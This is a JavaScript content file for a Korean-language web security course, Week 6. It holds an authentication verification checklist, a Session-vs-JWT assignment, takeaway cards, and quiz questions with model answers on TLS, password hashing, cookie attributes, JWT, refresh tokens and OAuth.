      const saved = LS.get('w6.verify', []);
      const draw = () => { el.innerHTML = `<div class="lab"><div class="lab-head"><span class="tag">체크리스트</span>VERIFY — AI 인증 코드 검증</div><div class="lab-out">${C.map((c, i) => `<label class="ck"><input type="checkbox" data-i="${i}" ${saved.includes(i) ? 'checked' : ''}><span>${esc(c)}</span></label>`).join('')}<p class="cm" style="margin:8px 0 0;font-size:13.5px">${saved.length} / ${C.length} 확인</p></div></div>`;
        el.querySelectorAll('input').forEach(b => b.onchange = () => { const i = +b.dataset.i, k = saved.indexOf(i); if (b.checked && k < 0) saved.push(i); if (!b.checked && k >= 0) saved.splice(k, 1); LS.set('w6.verify', saved); draw(); }); };
      draw(); } },
    H.note('AI는 “동작하는” 인증을 빠르게 만든다. 하지만 “안전한” 인증인지는 공격 시나리오를 떠올릴 수 있는 사람이 판단해야 한다.'),
    { h3: '과제 — Auth Architecture 비교 (스마트 교실)' },
    T(['단계', '할 일'], [['STEP 1', 'Session vs JWT 비교표 — 상태 · 즉시 차단 · Scale-out · 저장 위치 · 대표 위험'], ['STEP 2', 'Web · 모바일 App · IoT 센서 각각에 적절한 인증 방식과 근거'], ['STEP 3', '로그인 → 토큰 발급 → API 호출 → 인가 검사 시퀀스 다이어그램 + 401/403 실험 결과']]),
  ] },

{ id: 'w6.qc', title: 'Quick Check — Week 6', slides: 'S52, S54', tag: '점검',
  blocks: [
    `<p>강의 팁: 답하기 전에 “<b>어느 구간(네트워크 / 브라우저 / 서버 / DB)의 이야기인가</b>”를 먼저 정하면 대부분 풀린다.</p>`,
    { qc: 'w6' },
    { h3: 'Takeaways' },
    H.cards([['TLS는 통로를 지킨다', '기밀성 · 무결성 · 서버 인증. 인증서 체인으로 진짜 서버를 확인하지만, 서버 안 · 브라우저 안은 지키지 못한다.', ''], ['인증 ≠ 인가', '누구인가(401) vs 해도 되는가(403).<br>인증은 로그인 때 한 번, 인가는 요청마다 서버에서.', 'L3'], ['비밀번호는 저장하지 않는다', 'Argon2id/bcrypt + Salt로 “비교만 가능한 값”. 느린 해시가 공격을 비싸게 만든다.', 'L4'], ['세션은 기억, JWT는 증명', '세션은 즉시 차단에, JWT는 Scale-out에 유리. JWT는 서명일 뿐 암호화가 아니다.', 'L7'], ['짧은 출입증 + 깊이 보관한 재발급권', 'Access Token은 짧게, Refresh Token은 HttpOnly 쿠키로. 쿠키 속성이 XSS · CSRF를 가른다.', 'L3'], ['권한은 위임하고, 최소로', 'OAuth는 비밀번호 대신 scope가 제한된 토큰. IDOR은 소유권 검사로 막는다.', 'L7']]),
    H.note('다음 주 · Week 7 — 서버가 먼저 말을 걸어야 할 때: 실시간 통신(Polling · SSE · WebSocket · WebRTC)과 IoT(BLE · MQTT).'),
  ] },
] });

QUIZ.w6 = { bank: [], qc: [
  { q: '인증과 인가의 차이는? 각각 실패하면 몇 번 상태 코드인가?', ref: 'w6.authn', model: '<b>인증(Authentication)</b>은 “누구인가” — 실패하면 <b>401</b>. <b>인가(Authorization)</b>는 “이것을 해도 되는가” — 실패하면 <b>403</b>. 인증이 먼저, 인가가 그다음이며, 인가는 요청마다 서버에서 한다.', kw: ['인증 = 누구인가 → 401', '인가 = 해도 되는가 → 403', '인증 먼저, 인가는 요청마다'] },
  { q: 'TLS가 보장하는 세 가지 보안 목표는? TLS가 막지 못하는 공격 하나는?', ref: 'w6.cia', model: '<b>기밀성</b>(대칭키 암호) · <b>무결성</b>(MAC/AEAD) · <b>인증</b>(인증서 + 서명). TLS는 네트워크 구간만 지키므로 <b>XSS</b> · SQL Injection · 피싱 · 서버에 도착한 뒤의 DB 유출은 막지 못한다.', kw: ['기밀성 · 무결성 · 인증', '네트워크 구간만', 'XSS / SQLi / 피싱 중 하나'] },
  { q: '인증서 체인에서 브라우저가 처음부터 믿는 것은 무엇인가?', ref: 'w6.chain', model: 'OS · 브라우저의 <b>Trust Store에 미리 내장된 Root CA</b>. Root가 Intermediate를, Intermediate가 Leaf(서버 인증서)를 서명했으므로 서명을 따라 내려오며 신뢰를 물려받는다.', kw: ['Root CA', 'Trust Store에 내장', '서명을 따라 내려옴'] },
  { q: '비밀번호를 SHA-256 한 번으로 저장하면 안 되는 이유와 Salt의 역할은?', ref: 'w6.pw', model: 'SHA-256은 <b>너무 빠르고</b>, salt가 없으면 <b>같은 비밀번호 = 같은 해시</b>라 레인보우 테이블 · GPU 대입에 취약하다. <b>Salt</b>는 사용자마다 다른 무작위 값을 섞어 같은 비밀번호도 다른 해시가 되게 해 미리 만든 표를 무력화한다(비밀은 아니며 해시와 함께 저장). 그래서 Argon2id · bcrypt 같은 <b>느린 해시 + Salt</b>를 쓴다.', kw: ['너무 빠름 · 대입 공격', '같은 비번 = 같은 해시', 'Salt = 사용자별 무작위 → 레인보우 테이블 무력화', '느린 해시(Argon2id/bcrypt)'] },
  { q: 'Session 방식에서 쿠키에 담기는 값은 무엇이고, 사용자 정보는 어디에 있는가?', ref: 'w6.cookie', model: '쿠키에는 <b>의미 없는 무작위 Session ID</b>만 담긴다. 사용자 정보(누구 · role · 기한)는 <b>서버의 세션 저장소</b>(메모리 · Redis · DB)에 있다 — 세탁소 번호표와 가게 장부.', kw: ['무작위 Session ID만', '사용자 정보는 서버 저장소'] },
  { q: 'HttpOnly · Secure · SameSite는 각각 어떤 공격을 막는가?', ref: 'w6.attr', model: '<b>HttpOnly</b> — JS가 쿠키를 못 읽게 해 <b>XSS로 쿠키 탈취</b>를 막는다. <b>Secure</b> — HTTPS에서만 전송해 <b>평문 도청</b>을 막는다. <b>SameSite</b> — 다른 사이트에서 시작된 요청에 쿠키를 안 붙여 <b>CSRF</b>를 막는다.', kw: ['HttpOnly → XSS 탈취', 'Secure → 도청', 'SameSite → CSRF'] },
  { q: 'JWT는 암호화된 데이터인가? 누구나 읽을 수 있는데 왜 안전하다고 하는가?', ref: 'w6.verify', model: '<b>아니다.</b> Header · Payload는 Base64URL <b>인코딩</b>만 되어 누구나 읽는다. 안전한 이유는 <b>서명</b> 때문 — 내용을 바꾸면 서버 키로 다시 계산한 서명과 맞지 않아 거부된다(읽을 수 있지만 고칠 수 없다). 그래서 민감 정보는 넣지 않는다.', kw: ['암호화 아님 · 인코딩', '서명으로 변조 탐지', '민감 정보 넣지 않음'] },
  { q: 'Access Token은 짧게, Refresh Token은 길게 두는 이유는?', ref: 'w6.refresh', model: 'Access Token은 <b>모든 요청에 자주 노출</b>되므로 짧게 해 도난 시 피해 시간을 줄인다. Refresh Token은 <b>재발급 한 곳에만</b> 보내고 HttpOnly 쿠키에 깊이 보관하며, <b>서버 DB에 기록</b>해 폐기할 수 있게 해 편의(재로그인 없이)를 유지한다.', kw: ['AT = 자주 노출 → 짧게', 'RT = 드물게 · 깊이 보관', 'RT는 서버에서 폐기 가능'] },
  { q: 'OAuth 2.0은 왜 비밀번호를 앱에 주지 않아도 되는가? scope의 역할은?', ref: 'w6.oauth', model: '사용자는 <b>Authorization Server(구글) 화면에만</b> 로그인 · 동의하고, 앱은 그 결과로 <b>Access Token</b>을 받는다. <b>scope</b>는 토큰이 할 수 있는 일의 범위(예: 캘린더 쓰기만)를 제한한다 — 발레 키.', kw: ['Auth Server에만 로그인', '앱은 토큰만 받음', 'scope = 허용 범위 제한'] },
  { q: 'API Key와 사용자 로그인 토큰은 같은가? 무엇이 다른가?', ref: 'w6.apikey', model: '<b>다르다.</b> API Key는 <b>프로그램(앱 · 프로젝트)</b>을 식별하는 긴 수명의 고정 비밀이고, 로그인 토큰은 <b>사용자</b>를 나타내는 짧은 수명의 출입증이다. API Key만으로는 어떤 사용자인지 알 수 없다.', kw: ['API Key = 프로그램 식별', '토큰 = 사용자', 'API Key로는 사용자 모름'] },
] };
})();
